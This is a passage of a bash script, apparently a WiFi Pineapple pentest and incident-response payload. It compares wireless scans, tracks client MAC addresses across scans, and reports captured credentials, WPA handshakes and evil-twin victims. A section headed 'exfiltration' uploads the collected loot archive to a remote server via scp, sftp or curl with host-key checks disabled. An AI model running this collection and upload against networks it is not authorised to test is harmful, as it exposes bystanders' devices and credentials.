        echo "Unix Timestamp: $(date +%s)"
        echo ""

        # Current scan summary
        echo "** CURRENT SCAN SUMMARY **"
        echo "  Scan ID: IR_${TIMESTAMP}"
        echo "  Networks Detected: ${NETWORK_COUNT:-0}"
        echo "  Clients Connected: ${CLIENT_COUNT:-0}"
        echo "  DHCP Leases: ${LEASE_COUNT:-0}"
        echo ""

        # Compare with previous scans
        echo "** HISTORICAL COMPARISON **"
        prev_scans=$(ls -1t "${LOOT_DIR}"/IR_*/timeline/scan_metadata.txt 2>/dev/null | grep -v "$TIMESTAMP" | head -5)

        if [ -n "$prev_scans" ]; then
            echo "  Comparing with previous scans..."
            echo ""

            prev_scan_count=0
            echo "$prev_scans" | while read prev_scan; do
                prev_scan_count=$((prev_scan_count + 1))
                prev_id=$(dirname "$prev_scan" | xargs basename)
                echo "  --- Previous Scan: $prev_id ---"

                if [ -f "$prev_scan" ]; then
                    prev_networks=$(grep "Networks Detected:" "$prev_scan" | awk '{print $NF}')
                    prev_clients=$(grep "Clients Connected:" "$prev_scan" | awk '{print $NF}')
                    prev_leases=$(grep "DHCP Leases:" "$prev_scan" | awk '{print $NF}')

                    # Calculate deltas
                    network_delta=$((${NETWORK_COUNT:-0} - ${prev_networks:-0}))
                    client_delta=$((${CLIENT_COUNT:-0} - ${prev_clients:-0}))
                    lease_delta=$((${LEASE_COUNT:-0} - ${prev_leases:-0}))

                    echo "    Networks: ${prev_networks:-0} -> ${NETWORK_COUNT:-0} (${network_delta:+$network_delta})"
                    echo "    Clients:  ${prev_clients:-0} -> ${CLIENT_COUNT:-0} (${client_delta:+$client_delta})"
                    echo "    Leases:   ${prev_leases:-0} -> ${LEASE_COUNT:-0} (${lease_delta:+$lease_delta})"
                    echo ""
                fi
            done

            # New networks detection
            echo "  ** NEW NETWORKS (compared to last scan) **"
            latest_prev=$(echo "$prev_scans" | head -1)
            if [ -f "$(dirname $latest_prev)/../wireless/wifi_scan.txt" ]; then
                prev_ssids=$(grep "SSID:" "$(dirname $latest_prev)/../wireless/wifi_scan.txt" | sort | uniq)
                curr_ssids=$(grep "SSID:" "${REPORT_DIR}/wireless/wifi_scan.txt" 2>/dev/null | sort | uniq)

                new_ssids=$(comm -13 <(echo "$prev_ssids") <(echo "$curr_ssids") 2>/dev/null)
                if [ -n "$new_ssids" ]; then
                    echo "  New networks since last scan:"
                    echo "$new_ssids" | while read ssid; do
                        echo "    [+] $ssid"
                    done
                else
                    echo "  No new networks detected"
                fi
                echo ""

                # Disappeared networks
                echo "  ** DISAPPEARED NETWORKS **"
                gone_ssids=$(comm -23 <(echo "$prev_ssids") <(echo "$curr_ssids") 2>/dev/null)
                if [ -n "$gone_ssids" ]; then
                    echo "  Networks no longer visible:"
                    echo "$gone_ssids" | while read ssid; do
                        echo "    [-] $ssid"
                    done
                else
                    echo "  All previous networks still visible"
                fi
                echo ""
            fi

            # New clients detection
            echo "  ** NEW CLIENTS (compared to last scan) **"
            if [ -f "$(dirname $latest_prev)/../network/dhcp_leases.txt" ]; then
                prev_macs=$(grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$(dirname $latest_prev)/../network/dhcp_leases.txt" | sort | uniq)
                curr_macs=$(grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "${REPORT_DIR}/network/dhcp_leases.txt" 2>/dev/null | sort | uniq)

                new_macs=$(comm -13 <(echo "$prev_macs") <(echo "$curr_macs") 2>/dev/null)
                if [ -n "$new_macs" ]; then
                    echo "  New clients since last scan:"
                    echo "$new_macs" | while read mac; do
                        vendor=$(lookup_mac_vendor "$mac")
                        echo "    [+] $mac ($vendor)"
                    done
                else
                    echo "  No new clients detected"
                fi
                echo ""
            fi

        else
            echo "  No previous scans found for comparison"
            echo "  This is the first scan or historical data is unavailable"
        fi
        echo ""

        # Persistent client tracking
        echo "** PERSISTENT CLIENT ANALYSIS **"
        echo "  Clients seen across multiple scans (tracking across MAC randomization):"

        all_prev_scans=$(ls -1t "${LOOT_DIR}"/IR_*/network/dhcp_leases.txt 2>/dev/null | head -10)
        if [ -n "$all_prev_scans" ]; then
            # Count MAC address occurrences across scans
            all_macs=$(cat $all_prev_scans "${REPORT_DIR}/network/dhcp_leases.txt" 2>/dev/null | \
                       grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | sort | uniq -c | sort -rn)

            echo "$all_macs" | head -10 | while read count mac; do
                if [ "$count" -gt 2 ]; then
                    vendor=$(lookup_mac_vendor "$mac")
                    echo "    $mac - Seen $count times ($vendor)"
                fi
            done
        else
            echo "  Insufficient historical data"
        fi
        echo ""

    } > "${REPORT_DIR}/timeline/scan_metadata.txt"

    LOG "    [OK] Timeline analysis complete"
else
    # Still create basic metadata even if comparison is disabled
    {
        echo "Scan ID: IR_${TIMESTAMP}"
        echo "Unix Timestamp: $(date +%s)"
        echo "Networks Detected: ${NETWORK_COUNT:-0}"
        echo "Clients Connected: ${CLIENT_COUNT:-0}"
        echo "DHCP Leases: ${LEASE_COUNT:-0}"
    } > "${REPORT_DIR}/timeline/scan_metadata.txt"
fi

# ============================================================================
# GENERATE SUMMARY REPORT
# ============================================================================

LOG "[*] Generating summary report..."

{
    echo "╔══════════════════════════════════════════════════════════════════════╗"
    echo "║       INCIDENT RESPONSE & PENETRATION TESTING FORENSIC REPORT       ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Collection Timestamp: $(date)"
    echo "Report ID: IR_${TIMESTAMP}"
    echo "Scan Type: ${SCAN_TYPE} (${SCAN_DURATION_MSG})"
    echo "Report Directory: ${REPORT_DIR}"
    echo ""
    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  EXECUTIVE SUMMARY"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""

    # Key findings summary
    echo "** KEY FINDINGS **"
    echo ""
    echo "Networks & Clients:"
    echo "  - Nearby WiFi Networks: ${NETWORK_COUNT:-0}"
    echo "  - Connected Clients: ${CLIENT_COUNT:-0}"
    echo "  - DHCP Leases: ${LEASE_COUNT:-0}"
    echo ""

    # Security findings
    echo "Security Assessment:"
    WEP_TOTAL=$(grep -c "WEP Networks:" "${REPORT_DIR}/wireless/security_analysis.txt" 2>/dev/null); WEP_TOTAL=${WEP_TOTAL:-0}
    OPEN_TOTAL=$(grep "Open Networks:" "${REPORT_DIR}/wireless/security_analysis.txt" 2>/dev/null | head -1 | grep -oE '[0-9]+' || echo "0")
    WPS_TOTAL=$(grep "WPS Enabled:" "${REPORT_DIR}/wireless/security_analysis.txt" 2>/dev/null | head -1 | grep -oE '[0-9]+' || echo "0")

    echo "  - Vulnerable Networks (WEP): ${WEP_TOTAL}"
    echo "  - Open Networks (No Encryption): ${OPEN_TOTAL}"
    echo "  - WPS-Enabled Networks: ${WPS_TOTAL}"

    if [ -f "${REPORT_DIR}/credentials/credential_scan.txt" ]; then
        CRED_COUNT=$(grep -c "\[!\].*detected!" "${REPORT_DIR}/credentials/credential_scan.txt" 2>/dev/null); CRED_COUNT=${CRED_COUNT:-0}
        if [ "$CRED_COUNT" -gt 0 ]; then
            echo "  - [CRITICAL] Cleartext Credentials Detected: ${CRED_COUNT} findings"
        else
            echo "  - Cleartext Credentials: None detected"
        fi
    fi

    if [ -f "${REPORT_DIR}/analysis/rogue_device_detection.txt" ]; then
        ROGUE_COUNT=$(grep -c "\[!\]" "${REPORT_DIR}/analysis/rogue_device_detection.txt" 2>/dev/null); ROGUE_COUNT=${ROGUE_COUNT:-0}
        if [ "$ROGUE_COUNT" -gt 0 ]; then
            echo "  - Rogue Device Indicators: ${ROGUE_COUNT}"
        fi
    fi
    echo ""

    # Wireless Reconnaissance findings
    if [ -f "${REPORT_DIR}/analysis/nearby_access_points.txt" ]; then
        echo "** WIRELESS RECONNAISSANCE **"
        echo ""

        # Count nearby APs (use Unique BSSIDs count which is more reliable than parsing beacon lines)
        AP_COUNT=$(grep "Unique BSSIDs:" "${REPORT_DIR}/analysis/nearby_access_points.txt" 2>/dev/null | grep -oE '[0-9]+' | head -1); AP_COUNT=${AP_COUNT:-0}
        echo "  - Nearby Access Points Detected: ${AP_COUNT}"

        # Count probing devices
        if [ -f "${REPORT_DIR}/analysis/probe_requests.txt" ]; then
            PROBING_DEVICES=$(grep "Unique devices:" "${REPORT_DIR}/analysis/probe_requests.txt" 2>/dev/null | awk '{print $NF}' || echo "0")
            PROBED_SSIDS=$(grep "Unique SSIDs probed:" "${REPORT_DIR}/analysis/probe_requests.txt" 2>/dev/null | awk '{print $NF}' || echo "0")
            echo "  - Devices Probing for Networks: ${PROBING_DEVICES}"
            echo "  - Unique SSIDs Being Searched: ${PROBED_SSIDS}"
        fi

        # Deauth detection
        if [ -f "${REPORT_DIR}/analysis/deauth_detection.txt" ]; then
            DEAUTH_COUNT=$(grep "deauth/disassoc frames detected" "${REPORT_DIR}/analysis/deauth_detection.txt" 2>/dev/null | grep -oE '[0-9]+' | head -1 || echo "0")
            if [ "$DEAUTH_COUNT" -gt 0 ] 2>/dev/null; then
                echo "  - [ALERT] Deauth Frames Detected: ${DEAUTH_COUNT} (possible attack!)"
            else
                echo "  - Deauthentication Attacks: None detected"
            fi
        fi
        echo ""
    fi

    # Active interfaces
    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  NETWORK CONFIGURATION"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""
    echo "Active Network Interfaces:"
    ip link show | grep -E "^[0-9]" | awk '{print "  - " $2}' | sed 's/:$//'
    echo ""
    echo "Gateway: $(ip route | grep "^default" | awk '{print $3}' | head -1)"
    echo ""

    # Packet captures
    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  TRAFFIC CAPTURES"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""
    for pcap in "${REPORT_DIR}"/pcaps/*.pcap; do
        if [ -f "$pcap" ]; then
            filename=$(basename "$pcap")
            size=$(du -h "$pcap" | cut -f1)
            packets=$(check_tool capinfos && capinfos -c "$pcap" 2>/dev/null | grep "Number of packets" | awk '{print $NF}' || tcpdump -r "$pcap" 2>/dev/null | wc -l | tr -d ' ')
            echo "  $filename"
            echo "    Size: $size | Packets: $packets"
        fi
    done
    echo ""

    # Analysis results
    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  ANALYSIS RESULTS"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""

    if [ "$ENABLE_SERVICE_DISCOVERY" = true ]; then
        echo "Service Discovery:"
        [ -f "${REPORT_DIR}/services/mdns_discovery.txt" ] && echo "  - mDNS/Bonjour: Scanned"
        [ -f "${REPORT_DIR}/services/netbios_enum.txt" ] && echo "  - NetBIOS: Scanned"
        [ -f "${REPORT_DIR}/services/snmp_discovery.txt" ] && echo "  - SNMP: Scanned"
        [ -f "${REPORT_DIR}/services/upnp_discovery.txt" ] && echo "  - UPnP: Scanned"
        [ -f "${REPORT_DIR}/services/smb_enum.txt" ] && echo "  - SMB/CIFS: Scanned"
        echo ""
    fi

    if [ -f "${REPORT_DIR}/analysis/client_fingerprinting.txt" ]; then
        echo "Client Fingerprinting:"
        echo "  - MAC Vendor Identification: Complete"
        echo "  - OS Detection (TTL-based): Complete"
        echo "  - DHCP Fingerprinting: Complete"
        echo ""
    fi

    if [ -f "${REPORT_DIR}/timeline/scan_metadata.txt" ]; then
        echo "Timeline Analysis:"
        echo "  - Historical Comparison: Available"
        echo "  - New Device Detection: Available"
        echo ""
    fi

    # File inventory
    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  COLLECTED DATA INVENTORY"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""
    echo "System Information: $(ls -1 "${REPORT_DIR}"/system/ 2>/dev/null | wc -l) files"
    echo "Network Data: $(ls -1 "${REPORT_DIR}"/network/ 2>/dev/null | wc -l) files"
    echo "Wireless Data: $(ls -1 "${REPORT_DIR}"/wireless/ 2>/dev/null | wc -l) files"
    echo "Packet Captures: $(ls -1 "${REPORT_DIR}"/pcaps/*.pcap 2>/dev/null | wc -l) files"
    echo "Analysis Reports: $(ls -1 "${REPORT_DIR}"/analysis/ 2>/dev/null | wc -l) files"
    echo "Service Discovery: $(ls -1 "${REPORT_DIR}"/services/ 2>/dev/null | wc -l) files"
    [ -d "${REPORT_DIR}/credentials" ] && echo "Credential Scans: $(ls -1 "${REPORT_DIR}"/credentials/ 2>/dev/null | wc -l) files"
    echo "Log Files: $(ls -1 "${REPORT_DIR}"/logs/ 2>/dev/null | wc -l) files"
    echo ""
    REPORT_SIZE=$(du -sh "${REPORT_DIR}" | cut -f1)
    echo "Total Report Size: ${REPORT_SIZE}"
    echo ""

    # Bluetooth devices summary
    if [ -f "${REPORT_DIR}/bluetooth/bluetooth_devices.txt" ]; then
        BT_SUMMARY=$(grep "Total Bluetooth Devices:" "${REPORT_DIR}/bluetooth/bluetooth_devices.txt" 2>/dev/null | grep -oE '[0-9]+' | tail -1)
        if [ -n "$BT_SUMMARY" ] && [ "$BT_SUMMARY" -gt 0 ] 2>/dev/null; then
            echo "Bluetooth Devices: $BT_SUMMARY"
            echo ""
        fi
    fi

    # Recon Intelligence summary
    if [ -f "${REPORT_DIR}/analysis/recon_intelligence.txt" ]; then
        echo "═══════════════════════════════════════════════════════════════════════"
        echo "  RECON DATABASE INTELLIGENCE"
        echo "═══════════════════════════════════════════════════════════════════════"
        echo ""

        RECON_DEVICES=$(grep "Total Unique Devices Seen:" "${REPORT_DIR}/analysis/recon_intelligence.txt" 2>/dev/null | grep -oE '[0-9]+')
        RECON_SSIDS=$(grep "Total Unique SSIDs:" "${REPORT_DIR}/analysis/recon_intelligence.txt" 2>/dev/null | grep -oE '[0-9]+')
        RECON_CREDS=$(grep "Credentials Captured:" "${REPORT_DIR}/analysis/recon_intelligence.txt" 2>/dev/null | grep -oE '[0-9]+')
        RECON_HS=$(grep "WPA Handshakes:" "${REPORT_DIR}/analysis/recon_intelligence.txt" 2>/dev/null | grep -oE '[0-9]+' | tail -1)
        RECON_VICTIMS=$(grep "Evil Twin Victims:" "${REPORT_DIR}/analysis/recon_intelligence.txt" 2>/dev/null | grep -oE '[0-9]+')

        echo "  Historical Data from Pineapple Recon Module:"
        echo "    - Total Devices Observed:  ${RECON_DEVICES:-0}"
        echo "    - Total Networks Found:    ${RECON_SSIDS:-0}"
        echo ""

        if [ "${RECON_CREDS:-0}" -gt 0 ]; then
            echo "  [!!!] CREDENTIALS CAPTURED:  ${RECON_CREDS}"
        fi
        if [ "${RECON_HS:-0}" -gt 0 ]; then
            echo "  [!!] WPA HANDSHAKES:         ${RECON_HS}"
        fi
        if [ "${RECON_VICTIMS:-0}" -gt 0 ]; then
            echo "  [!] EVIL TWIN VICTIMS:       ${RECON_VICTIMS}"
        fi

        if [ "${RECON_CREDS:-0}" -gt 0 ] || [ "${RECON_HS:-0}" -gt 0 ]; then
            echo ""
            echo "  See: analysis/recon_intelligence.txt for details"
        fi
        echo ""
    fi

    # Severity Summary
    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  SEVERITY SUMMARY"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""

    TOTAL_SCORE=$((SCORE_CRITICAL + SCORE_HIGH + SCORE_MEDIUM + SCORE_LOW))

    # Determine overall risk level
    if [ "$TOTAL_SCORE" -ge 200 ]; then
        echo "  OVERALL RISK: [!!! CRITICAL !!!] - Immediate action required"
    elif [ "$TOTAL_SCORE" -ge 100 ]; then
        echo "  OVERALL RISK: [!! HIGH !!] - Significant issues found"
    elif [ "$TOTAL_SCORE" -ge 50 ]; then
        echo "  OVERALL RISK: [! MEDIUM !] - Issues require attention"
    elif [ "$TOTAL_SCORE" -gt 0 ]; then
        echo "  OVERALL RISK: [LOW] - Minor issues detected"
    else
        echo "  OVERALL RISK: [CLEAN] - No significant issues detected"
    fi
    echo ""

    # Risk score breakdown
    echo "  Risk Score Breakdown:"
    CRITICAL_COUNT=$((SCORE_CRITICAL / 100))
    HIGH_COUNT=$((SCORE_HIGH / 75))
    MEDIUM_COUNT=$((SCORE_MEDIUM / 50))
    LOW_COUNT=$((SCORE_LOW / 25))

    echo "    Critical findings: ${CRITICAL_COUNT} (${SCORE_CRITICAL} pts)"
    echo "    High findings:     ${HIGH_COUNT} (${SCORE_HIGH} pts)"
    echo "    Medium findings:   ${MEDIUM_COUNT} (${SCORE_MEDIUM} pts)"
    echo "    Low findings:      ${LOW_COUNT} (${SCORE_LOW} pts)"
    echo "    ─────────────────────────────"
    echo "    TOTAL SCORE:       ${TOTAL_SCORE} pts"
    echo ""

    # List findings by severity
    if [ -n "$FINDINGS_CRITICAL" ]; then
        echo "  [CRITICAL] Findings:"
        echo -e "$FINDINGS_CRITICAL"
    fi

    if [ -n "$FINDINGS_HIGH" ]; then
        echo "  [HIGH] Findings:"
        echo -e "$FINDINGS_HIGH"
    fi

    if [ -n "$FINDINGS_MEDIUM" ]; then
        echo "  [MEDIUM] Findings:"
        echo -e "$FINDINGS_MEDIUM"
    fi

    if [ -n "$FINDINGS_LOW" ]; then
        echo "  [LOW] Findings:"
        echo -e "$FINDINGS_LOW"
    fi
    echo ""

    # Recommendations
    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  RECOMMENDATIONS"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""

    if [ "${WEP_TOTAL:-0}" -gt 0 ] || [ "${OPEN_TOTAL:-0}" -gt 0 ]; then
        echo "HIGH PRIORITY:"
        [ "${WEP_TOTAL:-0}" -gt 0 ] && echo "  - ${WEP_TOTAL} WEP networks detected - IMMEDIATE UPGRADE REQUIRED"
        [ "${OPEN_TOTAL:-0}" -gt 0 ] && echo "  - ${OPEN_TOTAL} open networks detected - ENABLE ENCRYPTION"
        echo ""
    fi

    if [ "${CRED_COUNT:-0}" -gt 0 ]; then
        echo "CRITICAL:"
        echo "  - Cleartext credentials detected in network traffic"
        echo "  - Review ${REPORT_DIR}/credentials/credential_scan.txt"
        echo "  - Enforce encrypted protocols (HTTPS, SSH, SFTP)"
        echo "  - Consider immediate password rotation"
        echo ""
    fi

    if [ "${WPS_TOTAL:-0}" -gt 0 ]; then
        echo "MEDIUM PRIORITY:"
        echo "  - ${WPS_TOTAL} WPS-enabled networks vulnerable to PIN attacks"
        echo "  - Recommend disabling WPS on affected networks"
        echo ""
    fi

    echo "GENERAL:"
    echo "  - Review detailed reports in subdirectories"
    echo "  - Analyze packet captures for deeper insights"
    echo "  - Compare with future scans for change detection"
    echo ""

    echo "═══════════════════════════════════════════════════════════════════════"
    echo "  NEXT STEPS"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""
    echo "1. Review the SUMMARY_REPORT.txt (this file)"
    echo "2. Check wireless/security_analysis.txt for vulnerable networks"
    echo "3. Examine credentials/credential_scan.txt for exposed credentials"
    echo "4. Analyze analysis/client_fingerprinting.txt for device intelligence"
    echo "5. Review services/* for discovered network services"
    echo "6. Inspect pcaps/* with Wireshark, Tshark, or tcpdump for detailed analysis"
    echo "7. Compare timeline/scan_metadata.txt with previous scans"
    echo ""

    echo "╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                       COLLECTION COMPLETE                            ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Report ID: IR_${TIMESTAMP}"
    echo "Generated: $(date)"

    # Calculate and display elapsed time
    END_TIME=$(date +%s)
    ELAPSED_SECONDS=$((END_TIME - START_TIME))
    ELAPSED_MIN=$((ELAPSED_SECONDS / 60))
    ELAPSED_SEC=$((ELAPSED_SECONDS % 60))
    echo "Elapsed Time: ${ELAPSED_MIN}m ${ELAPSED_SEC}s (${ELAPSED_SECONDS} seconds)"
    echo ""

} > "${REPORT_DIR}/SUMMARY_REPORT.txt"

# ============================================================================
# COMPRESSION & ENCRYPTION
# ============================================================================

LOG ""

if [ "$SCAN_TYPE" = "QUICK" ]; then
    LOG "[*] Skipping archive creation for QUICK scan"
    ARCHIVE_NAME=""
    ARCHIVE_SIZE=""
else
LOG "[*] Creating compressed archive..."

cd "${LOOT_DIR}"
ARCHIVE_NAME="IR_${TIMESTAMP}.tar.gz"
tar -czf "$ARCHIVE_NAME" "IR_${TIMESTAMP}/" 2>/dev/null

if [ $? -eq 0 ]; then
    ARCHIVE_SIZE=$(du -sh "$ARCHIVE_NAME" | cut -f1)
    LOG "[+] Archive created: $ARCHIVE_NAME"
    LOG "[+] Archive size: ${ARCHIVE_SIZE}"

    # Encryption if enabled
    if [ "$ENCRYPT_ARCHIVE" = true ]; then
        LOG "[*] Encrypting archive..."

        if check_tool openssl; then
            ENCRYPTED_ARCHIVE="IR_${TIMESTAMP}.tar.gz.enc"

            if [ -n "$ENCRYPTION_PASSWORD" ]; then
                # Use configured password
                echo "$ENCRYPTION_PASSWORD" | openssl enc -aes-256-cbc -salt -in "$ARCHIVE_NAME" -out "$ENCRYPTED_ARCHIVE" -pass stdin 2>/dev/null
            else
                # Prompt for password (interactive mode only)
                openssl enc -aes-256-cbc -salt -in "$ARCHIVE_NAME" -out "$ENCRYPTED_ARCHIVE" 2>/dev/null
            fi

            if [ $? -eq 0 ]; then
                ENCRYPTED_SIZE=$(du -sh "$ENCRYPTED_ARCHIVE" | cut -f1)
                LOG "[+] Encrypted archive created: $ENCRYPTED_ARCHIVE"
                LOG "[+] Encrypted size: ${ENCRYPTED_SIZE}"
                LOG "[*] Encryption: AES-256-CBC"

                # Optionally remove unencrypted archive
                rm -f "$ARCHIVE_NAME"
                ARCHIVE_NAME="$ENCRYPTED_ARCHIVE"
                ARCHIVE_SIZE="$ENCRYPTED_SIZE"

                LOG "[!] IMPORTANT: Archive is encrypted. Keep password secure!"
                LOG "[*] Decrypt with: openssl enc -aes-256-cbc -d -in $ENCRYPTED_ARCHIVE -out IR_${TIMESTAMP}.tar.gz"
            else
                LOG "[!] Encryption failed - keeping unencrypted archive"
            fi
        else
            LOG "[!] openssl not available - skipping encryption"
        fi
    fi

    # Optionally remove uncompressed directory to save space
    # Uncomment the following line to auto-delete uncompressed data after archiving
    # rm -rf "${REPORT_DIR}"

else
    LOG "[!] Archive creation failed"
fi

fi  # End SCAN_TYPE != QUICK check

# ============================================================================
# REMOTE SYNC / EXFILTRATION
# ============================================================================

if [ "$ENABLE_REMOTE_SYNC" = true ] && [ -n "$REMOTE_SERVER" ] && [ -n "$REMOTE_PATH" ]; then
    LOG ""
    LOG "[*] Initiating remote sync to $REMOTE_SERVER..."

    if [ -f "${LOOT_DIR}/${ARCHIVE_NAME}" ]; then
        case "$REMOTE_METHOD" in
            "scp")
                if check_tool scp; then
                    LOG "[*] Using SCP for file transfer..."
                    scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                        "${LOOT_DIR}/${ARCHIVE_NAME}" \
                        "${REMOTE_SERVER}:${REMOTE_PATH}/" 2>/dev/null

                    if [ $? -eq 0 ]; then
                        LOG "[+] Remote sync successful!"
                        LOG "[+] File uploaded to: ${REMOTE_SERVER}:${REMOTE_PATH}/${ARCHIVE_NAME}"
                    else
                        LOG "[!] Remote sync failed - check credentials and network"
                    fi
                else
                    LOG "[!] SCP not available"
                fi
                ;;

            "sftp")
                if check_tool sftp; then
                    LOG "[*] Using SFTP for file transfer..."
                    echo "put ${LOOT_DIR}/${ARCHIVE_NAME} ${REMOTE_PATH}/" | \
                        sftp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                        "${REMOTE_SERVER}" 2>/dev/null

                    if [ $? -eq 0 ]; then
                        LOG "[+] Remote sync successful!"
                        LOG "[+] File uploaded to: ${REMOTE_SERVER}:${REMOTE_PATH}/${ARCHIVE_NAME}"
                    else
                        LOG "[!] Remote sync failed - check credentials and network"
                    fi
                else
                    LOG "[!] SFTP not available"
                fi
                ;;

            "curl")
                if check_tool curl; then
                    LOG "[*] Using CURL for file transfer..."
                    # Assumes REMOTE_SERVER is a full URL for HTTP upload
                    curl -F "file=@${LOOT_DIR}/${ARCHIVE_NAME}" \
                         "${REMOTE_SERVER}${REMOTE_PATH}" 2>/dev/null

                    if [ $? -eq 0 ]; then
                        LOG "[+] Remote sync successful!"
                    else
                        LOG "[!] Remote sync failed"
                    fi
                else
                    LOG "[!] CURL not available"
                fi
                ;;

            *)
                LOG "[!] Unknown remote method: $REMOTE_METHOD"
                LOG "[*] Supported methods: scp, sftp, curl"
                ;;
        esac
    else
        LOG "[!] Archive file not found - cannot sync"
    fi
else
    if [ "$ENABLE_REMOTE_SYNC" = true ]; then
        LOG "[!] Remote sync enabled but REMOTE_SERVER or REMOTE_PATH not configured"
    fi
fi

# ============================================================================
# COMPLETION
# ============================================================================

LED FINISH

LOG ""
LOG " ======================================"
LOG " INCIDENT RESPONSE COLLECTION COMPLETE!"
LOG " ======================================"
LOG ""
if [ -n "$SCAN_LABEL" ]; then
    LOG "[+] Report ID: IR_${TIMESTAMP}_${SANITIZED_LABEL}"
else
    LOG "[+] Report ID: IR_${TIMESTAMP}"
fi
LOG "[+] Scan Type: ${SCAN_TYPE}"
LOG "[+] Timestamp: $(date)"
LOG ""
LOG "Directories:"
LOG "  - Full Report: ${REPORT_DIR}"
LOG "  - Archive: ${LOOT_DIR}/${ARCHIVE_NAME}"
LOG ""
LOG "Collection Summary:"
LOG "  - WiFi Networks: ${NETWORK_COUNT:-0}"
LOG "  - Connected Clients: ${CLIENT_COUNT:-0}"
LOG "  - DHCP Leases: ${LEASE_COUNT:-0}"
LOG "  - Log Files: ${LOG_COUNT:-0}"
LOG ""

# Security findings summary
if [ -f "${REPORT_DIR}/wireless/security_analysis.txt" ]; then
    WEP_FINAL=$(grep -o "WEP Networks:.*[0-9]" "${REPORT_DIR}/wireless/security_analysis.txt" 2>/dev/null | grep -oE '[0-9]+' | head -1)
    OPEN_FINAL=$(grep -o "Open Networks:.*[0-9]" "${REPORT_DIR}/wireless/security_analysis.txt" 2>/dev/null | grep -oE '[0-9]+' | head -1)
    WPS_FINAL=$(grep -o "WPS Enabled:.*[0-9]" "${REPORT_DIR}/wireless/security_analysis.txt" 2>/dev/null | grep -oE '[0-9]+' | head -1)

    if [ "${WEP_FINAL:-0}" -gt 0 ] || [ "${OPEN_FINAL:-0}" -gt 0 ] || [ "${WPS_FINAL:-0}" -gt 0 ]; then
        LOG "Security Findings:"
        [ "${WEP_FINAL:-0}" -gt 0 ] && LOG "  - [!] WEP Networks: ${WEP_FINAL} (VULNERABLE)"
        [ "${OPEN_FINAL:-0}" -gt 0 ] && LOG "  - [!] Open Networks: ${OPEN_FINAL}"
        [ "${WPS_FINAL:-0}" -gt 0 ] && LOG "  - [!] WPS-Enabled: ${WPS_FINAL}"
        LOG ""
    fi
fi

if [ -f "${REPORT_DIR}/credentials/credential_scan.txt" ]; then
    CRED_FINAL=$(grep -c "\[!\].*detected!" "${REPORT_DIR}/credentials/credential_scan.txt" 2>/dev/null); CRED_FINAL=${CRED_FINAL:-0}
    if [ "$CRED_FINAL" -gt 0 ]; then
        LOG "  - [!!!] CRITICAL: Cleartext credentials detected!"
        LOG "    Review: ${REPORT_DIR}/credentials/credential_scan.txt"
        LOG ""
    fi
fi

LOG "Archive Information:"
if [ -n "${ARCHIVE_SIZE}" ]; then
    LOG "  - Archive Size: ${ARCHIVE_SIZE}"
fi
if [ "$ENCRYPT_ARCHIVE" = true ] && [ -f "${LOOT_DIR}/${ARCHIVE_NAME}" ]; then
    LOG "  - Encryption: AES-256-CBC (ENABLED)"
    LOG "  - [!] Keep encryption password secure!"
fi
if [ "$ENABLE_REMOTE_SYNC" = true ]; then
    LOG "  - Remote Sync: ENABLED"
fi
LOG ""
LOG "Next Steps:"
LOG "  1. Review: ${REPORT_DIR}/SUMMARY_REPORT.txt"
LOG "  2. Analyze vulnerable networks"
LOG "  3. Check for credential exposures"
LOG "  4. Examine packet captures with Wireshark"
LOG ""

# Calculate final elapsed time for screen display
FINAL_END_TIME=$(date +%s)
FINAL_ELAPSED=$((FINAL_END_TIME - START_TIME))
FINAL_MIN=$((FINAL_ELAPSED / 60))
FINAL_SEC=$((FINAL_ELAPSED % 60))
LOG "Scan Duration: ${FINAL_MIN}m ${FINAL_SEC}s (${FINAL_ELAPSED} seconds)"
LOG ""
LOG " ================="
LOG " HAPPY PENTESTING!"
LOG " ================="
LOG ""

# Send comprehensive notification alert
ALERT_MSG="IR Collection Complete - Report:IR_${TIMESTAMP} | Networks:${NETWORK_COUNT:-0}"

if [ -n "${WEP_FINAL}" ] && [ "${WEP_FINAL}" -gt 0 ]; then
    ALERT_MSG="${ALERT_MSG} | WEP:${WEP_FINAL}[!]"
fi
if [ -n "${OPEN_FINAL}" ] && [ "${OPEN_FINAL}" -gt 0 ]; then
    ALERT_MSG="${ALERT_MSG} | Open:${OPEN_FINAL}[!]"
fi
if [ -n "${CRED_FINAL}" ] && [ "${CRED_FINAL}" -gt 0 ]; then
    ALERT_MSG="${ALERT_MSG} | CREDS:${CRED_FINAL}[!!!]"
fi

ALERT "$ALERT_MSG"
